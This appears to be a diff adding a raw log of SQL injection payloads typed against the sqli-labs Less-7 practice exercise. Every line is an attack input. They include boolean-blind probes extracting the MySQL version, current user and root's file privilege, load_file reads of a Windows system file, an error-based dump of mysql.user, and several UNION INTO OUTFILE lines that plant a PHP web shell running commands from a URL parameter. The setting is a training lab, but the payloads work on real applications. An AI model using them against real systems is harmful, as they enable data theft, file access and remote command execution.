@@ -1,0 +1,128 @@
+ID:1
+ID:1'
+ID:1'))-- 
+ID:1')) AND 1=1-- 
+ID:1')) union select 1,2,3 into outfile 'c:\\xampp\\htdocs\\Less-7\\outfile.txt'-- 
+ID:1')) union select 1,2,3 into outfile 'c:\xampp\htdocs\Less-7\outfile.txt'-- 
+ID:1')) union select 1,2,3 into outfile 'c:\xampp\htdocs\Less-7\outfile.txt'-- 
+ID:1')) union select 1,2,3 into outfile 'c:\xampp\htdocs\Less-7\outfile.txt'-- 
+ID:1')) union select 1,2,3 into outfile 'c:\xampp\htdocs\Less-7\outfile.txt'-- 
+ID:1')) union select 1,2,3 into outfile 'c:\xampp\htdocs\Less-7\outfile.txt'-- 
+ID:1')) union select 1,2,3 into outfile 'c:\xampp\htdocs\Less-7\outfile.txt'-- 
+ID:1')) union select 1,2,3 into outfile 'c:\xampp\htdocs\Less-7\outfile.txt'-- 
+ID:1')) union select 1,2,3 into outfile 'c:\\xampp\\htdocs\\Less-7\\outfile.txt'-- 
+ID:1')) union select 1,2,3 into outfile 'c:\\xampp\\htdocs\\Less-7\\outfile.txt'-- 
+ID:1')) union select 1,2,3 into outfile 'c:\\wamp64\\htdocs\\sqli-labs\\Less-7\\outfile.txt'-- 
+ID:1')) union select 1,2,3 into outfile 'c:\\wamp64\\www\\sqli-labs\\Less-7\\outfile.txt'-- 
+ID:1')) union select 1,2,3 into outfile 'c:\\wamp64\\www\\sqli-labs\\Less-7\\outfile.txt'-- 
+ID:1')) union select 1,2,3 into outfile 'c:\\wamp64\\www\\sqli-labs\\Less-7\\outfile.txt'-- 
+ID:2')) union select 1,2,3 into outfile 'c:\\wamp64\\www\\sqli-labs\\Less-7\\outfile.txt'-- 
+ID:2')) union select 1,2,3 into outfile 'c:\\wamp64\\www\\sqli-labs\\Less-7\\outfile.txt'-- 
+ID:1" AND SUBSTRING(version(),1,1)='0'-- 
+ID:1" AND SUBSTRING(version(),1,1)='1'-- 
+ID:1" AND SUBSTRING(version(),1,1)='2'-- 
+ID:1" AND SUBSTRING(version(),1,1)='3'-- 
+ID:1" AND SUBSTRING(version(),1,1)='4'-- 
+ID:1" AND SUBSTRING(version(),1,1)='5'-- 
+ID:1" AND SUBSTRING(version(),1,1)='6'-- 
+ID:1" AND SUBSTRING(version(),1,1)='7'-- 
+ID:1" AND SUBSTRING(version(),1,1)='8'-- 
+ID:1" AND SUBSTRING(version(),1,1)='9'-- 
+ID:1" AND SUBSTRING(version(),1,1)='.'-- 
+ID:1" and substring(load_file('C:\\\\Windows\\\\win.ini'),1,1)=';'-- 
+ID:1')) and substring(load_file('C:\\\\Windows\\\\win.ini'),1,1)=';'-- 
+ID:1')) UNION select --"<?php system($_GET['cmd']); ?>",1,1 into outfile 'C:/wamp64/www/shell.php'-- '
+ID:1')) AND SUBSTRING(version(),1,1)='0'-- 
+ID:1')) AND SUBSTRING(version(),1,1)='1'-- 
+ID:1')) AND SUBSTRING(version(),1,1)='2'-- 
+ID:1')) AND SUBSTRING(version(),1,1)='3'-- 
+ID:1')) AND SUBSTRING(version(),1,1)='4'-- 
+ID:1')) AND SUBSTRING(version(),1,1)='5'-- 
+ID:1')) UNION select --"<?php system($_GET['cmd']); ?>",1,1 into outfile 'C:/wamp64/www/shell.php'-- 
+ID:1')) AND SUBSTRING(version(),2,1)='0'-- 
+ID:1')) AND SUBSTRING(version(),2,1)='1'-- 
+ID:1')) AND SUBSTRING(version(),2,1)='2'-- 
+ID:1')) AND SUBSTRING(version(),2,1)='3'-- 
+ID:1')) AND SUBSTRING(version(),2,1)='4'-- 
+ID:1')) AND SUBSTRING(version(),2,1)='5'-- 
+ID:1')) AND SUBSTRING(version(),2,1)='6'-- 
+ID:1')) AND SUBSTRING(version(),2,1)='7'-- 
+ID:1')) AND SUBSTRING(version(),2,1)='8'-- 
+ID:1')) AND SUBSTRING(version(),2,1)='9'-- 
+ID:1')) AND SUBSTRING(version(),2,1)='.'-- 
+ID:1')) AND SUBSTRING(version(),3,1)='0'-- 
+ID:1')) AND SUBSTRING(version(),3,1)='1'-- 
+ID:1')) AND SUBSTRING(version(),3,1)='2'-- 
+ID:1')) AND SUBSTRING(version(),3,1)='3'-- 
+ID:1')) AND SUBSTRING(version(),3,1)='4'-- 
+ID:1')) AND SUBSTRING(version(),3,1)='5'-- 
+ID:1')) AND SUBSTRING(version(),4,1)='0'-- 
+ID:1')) AND SUBSTRING(version(),4,1)='1'-- 
+ID:1')) AND SUBSTRING(version(),4,1)='2'-- 
+ID:1')) AND SUBSTRING(version(),4,1)='3'-- 
+ID:1')) AND SUBSTRING(version(),4,1)='4'-- 
+ID:1')) AND SUBSTRING(version(),4,1)='5'-- 
+ID:1')) AND SUBSTRING(version(),4,1)='6'-- 
+ID:1')) AND SUBSTRING(version(),4,1)='7'-- 
+ID:1')) AND SUBSTRING(version(),4,1)='8'-- 
+ID:1')) AND SUBSTRING(version(),4,1)='9'-- 
+ID:1')) AND SUBSTRING(version(),4,1)='.'-- 
+ID:1')) UNION select "<?php system($_GET['cmd']); ?>",1,1 into outfile 'C:/wamp64/www/shell.php'-- 
+ID:1')) AND SUBSTRING(version(),5,1)='0'-- 
+ID:1')) AND SUBSTRING(version(),5,1)='1'-- 
+ID:1')) AND SUBSTRING(version(),5,1)='2'-- 
+ID:1')) AND SUBSTRING(version(),5,1)='3'-- 
+ID:1')) AND SUBSTRING(version(),5,1)='4'-- 
+ID:1')) AND SUBSTRING(version(),5,1)='5'-- 
+ID:1')) AND SUBSTRING(version(),5,1)='6'-- 
+ID:1')) AND SUBSTRING(version(),6,1)='0'-- 
+ID:1')) AND SUBSTRING(version(),6,1)='1'-- 
+ID:1')) AND SUBSTRING(version(),6,1)='2'-- 
+ID:1')) AND SUBSTRING(version(),7,1)='0'-- 
+ID:1')) AND SUBSTRING(version(),7,1)='1'-- 
+ID:1')) AND SUBSTRING(version(),7,1)='2'-- 
+ID:1')) AND SUBSTRING(version(),7,1)='3'-- 
+ID:1')) AND SUBSTRING(version(),7,1)='4'-- 
+ID:1')) AND SUBSTRING(version(),7,1)='5'-- 
+ID:1')) AND SUBSTRING(version(),7,1)='6'-- 
+ID:1')) AND SUBSTRING(version(),7,1)='7'-- 
+ID:1')) AND SUBSTRING(version(),7,1)='8'-- 
+ID:1')) AND SUBSTRING(version(),7,1)='9'-- 
+ID:1')) AND SUBSTRING(version(),7,1)='.'-- 
+ID:1')) UNION select "<?php system($_GET['cmd']); ?>",1,1 into outfile 'C:/wamp64/www/shell.php'-- 
+ID:')) or extractvalue(1,concat(0x7e,(select group_concat(user,0x7e,file_priv,0x7e) from mysql.user)))-- 
+ID:')) and substring(user(),1,1)='r'-- 
+ID:')) and substring(user,1,1)='r'-- 
+ID:')) and substring((select user()),1,1)='r'-- 
+ID:')) or substring((select user()),1,1)='r'-- 
+ID:')) and substring((select user()),1,1)='r'-- 
+ID:')) and substring(select user(),1,1)='r'-- 
+ID:')) and substring(select user(),1,1)='o'-- 
+ID:1')) and substring(load_file('C:\\\\Windows\\\\win.ini'),1,1)=';'-- 
+ID:1')) and substring(@@user,1,1)='r'-- 
+ID:')) and substring(select user(),1,1)='o'-- 
+ID:')) and substring((select user()),1,1)='o'-- 
+ID:')) and substring((select user()),1,1)='r'-- 
+ID:')) and substring((select user()),1,1)='r'--
+ID:')) and substring((select user()),1,1)='r'--
+ID:')) and substring((select user()),1,1)='r'-- 
+ID:')) and substring((select user()),1,1)='t'-- 
+ID:')) and substring((select user();),1,1)='t'-- 
+ID:')) and substring((select user()),1,1)='t'-- 
+ID:')) and substring((select user()),1,1)='t'-- 
+ID:1')) and substring(load_file('C:\\\\Windows\\\\win.ini'),1,1)=';'-- 
+ID:')) and substring((select user()),1,1)='t'-- 
+ID:1')) and substring(load_file('C:\\\\Windows\\\\win.ini'),1,1)=';'-- 
+ID:')) and substring((select user()),1,1)='r'-- 
+ID:')) and substring((select user()),1,1)='r'-- 
+ID:1')) and substring((select user()),1,1)='r'-- 
+ID:1')) and substring((select user()),1,1)='o'-- 
+ID:1')) and substring((select file_priv from mysql.users where user='root'),1,1)='r'-- 
+ID:1')) and substring((select file_priv from mysql.user where user='root'),1,1)='r'-- 
+ID:1')) and substring((select file_priv from mysql.user where user='root' limit 0,1),1,1)='r'-- 
+ID:1')) and substring((select file_priv from mysql.user where user='root' limit 0,1),1,1)='Y'-- 
+ID:1')) and (SELECT file_priv FROM mysql.user WHERE user='root' LIMIT 0,1) = 'Y'-- 
+ID:1')) and (SELECT file_priv FROM mysql.user WHERE user='root' LIMIT 0,1) = 'Y'-- 
+ID:1')) and (SELECT file_priv FROM mysql.user WHERE user='root' LIMIT 0,1) = 'Y'-- 
+ID:1')) and (SELECT file_priv FROM mysql.user WHERE user='root' LIMIT 0,1) = 'Y'-- 
+ID:1')) and (SELECT file_priv FROM mysql.user WHERE user='root' LIMIT 0,1) = 'Y'-- 
